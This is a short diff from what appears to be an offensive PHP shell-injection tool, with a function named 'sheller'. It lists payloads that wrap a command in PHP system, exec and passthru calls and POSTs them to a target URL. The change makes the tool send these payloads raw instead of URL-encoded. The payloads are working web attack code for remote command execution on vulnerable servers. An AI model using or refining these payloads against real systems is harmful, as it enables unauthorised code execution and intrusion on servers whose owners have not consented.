@@ -1213,7 +1213,7 @@ def sheller(
             payloads = [
                 '<?php system("{}"); ?>'.format(PAYLOAD),
                 '<?php exec("{}"); ?>'.format(PAYLOAD),
-                '<?php passthru("{}"); ?>'.format(PAYLOAD)
+                '<?php passthru("{}"); ?>'.format(PAYLOAD),
             ]
             names = [
                 "php input.system():   ",
@@ -1240,7 +1240,7 @@ def sheller(
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
-                        data=quote(payloads[i])
+                        data=payloads[i]
                     )
                     prep = s.prepare_request(req)
                 elif attack == 3:
@@ -1248,7 +1248,7 @@ def sheller(
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
-                        data=quote(payloads[i])
+                        data=payloads[i]
                     )
                     prep = s.prepare_request(req)
                 else:
